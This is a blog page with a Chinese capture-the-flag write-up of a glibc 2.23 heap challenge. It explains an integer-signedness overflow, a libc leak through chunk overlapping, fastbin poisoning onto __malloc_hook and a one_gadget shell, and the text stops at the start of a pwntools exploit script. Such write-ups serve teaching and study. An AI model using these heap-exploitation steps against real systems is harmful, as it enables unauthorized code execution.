@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="B1ear">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2026/05/10/fastbin-attack/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FastBin Attack 整数溢出堆利用实战">
+<meta property="og:url" content="http://example.com/2026/05/10/fastbin-attack/index.html">
+<meta property="og:site_name" content="Bear">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-05-10T21:32:00.000Z">
+<meta property="article:modified_time" content="2026-05-10T17:09:12.699Z">
+<meta property="article:author" content="B1ear">
+<meta property="article:tag" content="Fastbin">
+<meta property="article:tag" content="One Gadget">
+<meta property="article:tag" content="glibc 2.23">
+<meta property="article:tag" content="堆利用">
+<meta property="article:tag" content="整数溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/avatar.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/avatar.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            FastBin Attack 整数溢出堆利用实战 | Bear
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <style>.home-banner-background{filter:blur(5px)}.navbar-content.has-home-banner{--first-text-color:#fffde7;--default-text-color:#fffde7}.article-content.markdown-body h1{font-size:2.5rem!important}.article-content.markdown-body h2{font-size:2.0rem!important}.article-content.markdown-body h3{font-size:1.5rem!important}.article-content.markdown-body h4{font-size:1rem!important}.article-title-regular{font-size:3.0rem!important}.article-title-cover{font-size:3.0rem!important}</style>
+                
+    
+            
+                
+                    <script data-swup-reload-script>document.addEventListener('DOMContentLoaded',function(){document.title=document.title.replace(/ - .*/,'')})</script>
+                
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/bg.jpg","dark":"/images/bg.jpg"},"title":"Bear","subtitle":{"text":["I'm fine thank you"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[{"icon":"fa-brands fa-github","url":null},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":"you@example.com"},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}},"mathjax":{"enable":true}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"transparent","right":"transparent","transparency":10},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":false,"icon":"<i class=\"fa-solid fa-lollipop\"></i>","start":"","statistics":false,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.i18n = {"search":"Search...","toc":"On this page","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"POWERED BY %s","theme":"THEME","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","post":"Post","posts":"Posts","tagcloud":"Tag Cloud","comment":"Comment","comments":"Comments","home":"Home","archive":"Archive","archives":"Archives","top":"TOP","sticky":"Sticky","go-back-home":"Go Back Home","masonry_loading":"Loading photos...","image_viewer":"Image viewer","close":"Close","exif":{"title":"EXIF","cards":{"camera":"Camera","lens":"Lens","exposure":"Exposure","other":"Other"},"fields":{"make":"Brand","model":"Model","date_taken":"Date taken","lens_model":"Lens","focal_length":"Focal length","focus_mode":"Focus mode","shutter":"Shutter","aperture":"Aperture","iso":"ISO","exposure_program":"Exposure program","exposure_compensation":"Exposure compensation","metering_mode":"Metering mode","flash":"Flash","white_balance":"White balance","latitude":"Latitude","longitude":"Longitude","altitude":"Altitude"},"status":{"loading":"Loading...","no_exif":"No EXIF available","library_missing":"EXIF library not loaded","image_source_missing":"Image source unavailable","unavailable":"EXIF unavailable (blocked by CORS or missing metadata)","flag_unavailable":"EXIF unavailable"}},"about":"About","changelog":"Changelog","links":"Links","link":"Link","friends":"Friends","friend":"Friend","timeline":"Timeline","shuoshuo":"Shuoshuo","bookmarks":"Bookmarks","site_uv":"VISITOR COUNT","site_pv":"TOTAL PAGE VIEWS","read_more":"Read more","wordcount":"Words","min2read":"Mins","status":"Status","runtime":"Blog up for","days":"days","hours":"hrs","minutes":"Min","seconds":"Sec","optimized_by":"and Optimized by Evan","rights":"All Rights Reserved","site_posts":"%s posts in total","site_wordcount":"%s words in total","copyright":{"author":"Author","title":"Title","link":"Link","create_time":"Created at","update_time":"Updated at","license_title":"License","license_content":"This work is licensed under %s.","all_rights_reserved":"All Rights Reserved &#169; %s","public_domain":"This work is in the public domain."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"},"create_time":"Created","update_time":"Updated","expired":"This post is written %s days ago, and the content may not be up to date."};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Bear
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">35</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">FastBin Attack 整数溢出堆利用实战</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/avatar.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">B1ear</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-10 21:32</span>
+        <span class="mobile">2026-05-10 21:32</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-10 17:09:12</span>
+            <span class="mobile">2026-05-10 17:09:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/">堆利用</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Fastbin/">Fastbin</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">整数溢出</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/One-Gadget/">One Gadget</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/glibc-2-23/">glibc 2.23</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>glibc 2.23 经典堆利用 | Chunk Overlapping + Fastbin Poisoning + One Gadget</p>
+</blockquote>
+<h2 id="0x01-题目环境"><a href="#0x01-题目环境" class="headerlink" title="0x01 题目环境"></a>0x01 题目环境</h2><ul>
+<li><strong>漏洞类型</strong>：Integer Overflow (整数溢出) 导致的 Heap Overflow (堆溢出)</li>
+<li><strong>利用手法</strong>：Chunk Overlapping + Fastbin Poisoning + One Gadget</li>
+<li><strong>运行环境</strong>：glibc 2.23 (Ubuntu 16.04 经典堆机制)</li>
+<li><strong>保护机制</strong>：开启了 ASLR、NX、PIE 和 Canary</li>
+</ul>
+<h2 id="0x02-核心漏洞分析"><a href="#0x02-核心漏洞分析" class="headerlink" title="0x02 核心漏洞分析"></a>0x02 核心漏洞分析</h2><p>通过对程序的逆向分析，发现在 <code>delete</code> 函数中，程序在释放堆块后会严格地将指针置空（<code>*(&amp;ptr + v1) = 0LL</code>），因此<strong>不存在常规的 UAF 或 Double Free 漏洞</strong>。</p>
+<p>真正的致命漏洞隐藏在 <code>edit</code> 函数中：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> nbytes; <span class="comment">// 这是一个【有符号】整数 (Signed Integer)</span></span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line"><span class="keyword">if</span> ( nbytes &lt;= <span class="number">96</span> ) <span class="comment">// 漏洞点：防线被击穿</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// nbytes 被转换为无符号整数 size_t</span></span><br><span class="line">    read(<span class="number">0</span>, *(&amp;ptr + nbytes_4), (<span class="type">unsigned</span> <span class="type">int</span>)nbytes); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里存在经典的<strong>符号位安全隐患 (Signedness Bug)</strong>。当我们输入大小为 <code>-1</code> 时，<code>-1 &lt;= 96</code> 的判断条件成立。但在进入 <code>read</code> 函数时，<code>-1</code> 被强制转换为无符号整数 <code>0xFFFFFFFF</code>（近 4GB）。这使得我们可以对一个仅有 <code>0x60</code> 字节的堆块写入任意长度的数据，构成了极为严重的<strong>堆溢出 (Heap Overflow)</strong>。</p>
+<h2 id="0x03-攻击利用思路"><a href="#0x03-攻击利用思路" class="headerlink" title="0x03 攻击利用思路"></a>0x03 攻击利用思路</h2><p>题目在 <code>add</code> 功能中写死了只能申请固定大小 <code>0x60</code>（实际 Chunk Size 为 <code>0x70</code>）的堆块。这就要求我们必须利用堆溢出，手动伪造堆块结构来打通攻击链。</p>
+<h3 id="Step-1-伪造-Chunk-泄露-Libc-基址"><a href="#Step-1-伪造-Chunk-泄露-Libc-基址" class="headerlink" title="Step 1: 伪造 Chunk 泄露 Libc 基址"></a>Step 1: 伪造 Chunk 泄露 Libc 基址</h3><p>由于所有的 Chunk 都是 Fastbin 大小，直接 <code>free</code> 不会产生包含 <code>main_arena</code> 指针的 Unsorted Bin。</p>
+<p><strong>初始内存布局</strong>：连续申请 4 个 chunk（0, 1, 2, 3），它们在内存中紧挨着。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">           +-------------------------+</span><br><span class="line">Chunk 0 -&gt; | prev_size = 0           |</span><br><span class="line">           | size = 0x71             |</span><br><span class="line">           | user_data (0x60 bytes)  |</span><br><span class="line">           +-------------------------+</span><br><span class="line">Chunk 1 -&gt; | prev_size = 0           |</span><br><span class="line">           | size = 0x71             | &lt;--- 目标：修改这里</span><br><span class="line">           | user_data (0x60 bytes)  |</span><br><span class="line">           +-------------------------+</span><br><span class="line">Chunk 2 -&gt; | prev_size = 0           |</span><br><span class="line">           | size = 0x71             |</span><br><span class="line">           | user_data (0x60 bytes)  |</span><br><span class="line">           +-------------------------+</span><br><span class="line">Chunk 3 -&gt; | prev_size = 0           |</span><br><span class="line">           | size = 0x71             |</span><br><span class="line">           +-------------------------+</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>触发溢出，篡改 Chunk 1 的 Size</strong>：通过 <code>edit(0, -1, payload)</code> 溢出 Chunk 0，将 Chunk 1 的 size 从 <code>0x71</code> 修改为 <code>0xe1</code>（相当于将 Chunk 1 和 Chunk 2 在逻辑上合并）。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">           +-------------------------+</span><br><span class="line">Chunk 1 -&gt; | prev_size = 0           |</span><br><span class="line">           | size = 0xe1 (伪造大小)  | &lt;--- 系统认为 Chunk1 有 0xe0 这么大</span><br><span class="line">           | user_data (0x60 bytes)  |</span><br><span class="line">           +-------------------------+</span><br><span class="line">Chunk 2 -&gt; | (原本 Chunk 2 的 header) | &lt;--- 被包裹在伪造的 Chunk1 内部</span><br><span class="line">           | user_data               |</span><br><span class="line">           +-------------------------+</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>释放与切割</strong>：执行 <code>delete(1)</code>，系统读取到 size 为 <code>0xe0</code>，放入 <strong>Unsorted Bin</strong>。再次 <code>add()</code> 时，系统从 <code>0xe0</code> 大块中切下前一半分配，<strong>剩下的一半刚好落在原本 Chunk 2 的位置</strong>，其 <code>fd</code> 包含 <code>main_arena+88</code> 地址。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">           +-------------------------+</span><br><span class="line">Chunk 2 -&gt; | size = 0x71 (新Unsorted)| &lt;--- Unsorted Bin 新头部</span><br><span class="line">           | fd = main_arena+88      | &lt;--- libc 内部地址</span><br><span class="line">           | bk = main_arena+88      |</span><br><span class="line">           +-------------------------+</span><br></pre></td></tr></table></figure></div>
+
+<p>此时 <code>show(2)</code> 即可泄露 Libc 基址。</p>
+<h3 id="Step-2-Fastbin-Poisoning-劫持-fd-指针"><a href="#Step-2-Fastbin-Poisoning-劫持-fd-指针" class="headerlink" title="Step 2: Fastbin Poisoning (劫持 fd 指针)"></a>Step 2: Fastbin Poisoning (劫持 fd 指针)</h3><p><strong>目标</strong>：把 Fastbin 的 <code>fd</code> 改写为 <code>__malloc_hook</code> 附近的地址。</p>
+<p><strong>为什么是 <code>__malloc_hook - 0x23</code>？</strong> 申请块时系统会检查目标地址的 <code>size</code> 是否合法。在 glibc 2.23 的 <code>__malloc_hook</code> 前方，内存中天然存在一个 <code>0x7f</code> 字节：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7f...aaf8:  00 00 00 00 00 00 00 7f &lt;--- 天然的 0x7f</span><br><span class="line">0x7f...ab10:  [__malloc_hook 变量本体]</span><br></pre></td></tr></table></figure></div>
+
+<p>将 fake chunk 起始地址设为 <code>__malloc_hook - 0x23</code>，天然的 <code>0x7f</code> 刚好落在 size 字段，通过 Fastbin 安全检查。</p>
+<p><strong>溢出覆盖 fd</strong>：</p>
+<ul>
+<li>执行 <code>delete(4)</code>，Chunk 4 进入 Fastbin</li>
+<li>利用堆溢出覆盖 Chunk 4 的 <code>fd</code> 为 <code>__malloc_hook - 0x23</code></li>
+</ul>
+<h3 id="Step-3-触发-One-Gadget-Get-Shell"><a href="#Step-3-触发-One-Gadget-Get-Shell" class="headerlink" title="Step 3: 触发 One Gadget (Get Shell)"></a>Step 3: 触发 One Gadget (Get Shell)</h3><ol>
+<li>连续两次分配 <code>0x60</code>，第二次分配到 <code>__malloc_hook</code> 附近</li>
+<li>覆写 <code>__malloc_hook</code> 为 <code>one_gadget</code> 地址</li>
+<li>调用 <code>add</code> 触发 <code>malloc</code>，跳转执行 <code>one_gadget</code> 获取 Shell</li>
+</ol>
+<h2 id="0x04-Exploit-代码"><a href="#0x04-Exploit-代码" class="headerlink" title="0x04 Exploit 代码"></a>0x04 Exploit 代码</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span 